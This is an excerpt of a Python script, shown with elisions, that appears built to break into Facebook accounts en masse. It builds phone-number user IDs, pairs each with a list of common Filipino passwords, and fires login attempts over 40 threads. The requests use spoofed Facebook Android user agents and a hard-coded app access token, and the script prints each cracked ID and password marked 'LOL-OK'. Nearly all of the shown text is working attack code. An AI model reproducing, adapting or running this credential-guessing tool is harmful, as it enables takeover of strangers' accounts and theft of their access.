...
def uaa():
    return "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/151.0.0.56.195;FBPN/com.facebook.katana;FBLC/en_US;FBBV/340878164;FBCR/null;FBMF/Oppo;FBBD/Oppo;FBDV/CPH2137;FBSV/12;FBCA/arm64-v8a:;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
...
def ph():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=40) as zain:
			clear()
			tl = str(len(user))
			...
			for psx in user:
				ids = code+psx
				passlist = [psx,ids,'gandako','pogiko','magandaako','pogiako','cuteko','iloveyou','i love you','cuteko123','maganda123','pogi123','putanginamo','iloveyou143','gwapako','pogiko123','pogiako123','gandako123','gwapako123']
...
def rd1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [LOL-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(111111111,999999999))+";[FBAN/EMA;FBAV/212.0.0.76.204;FBPN/com.facebook.%s;FBLC/en_GB;FBBV/830527153;FBCR/GLOBE;FBMF/Oppo;FBBD/Oppo;FBDV/CPH2223;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [LOL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/331.0.0.17.92;FBBV/227363873;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.%s;FBDV/SM-G313F;FBSV/8.0;FBCA/armeabi-v7a:armeabi;]"
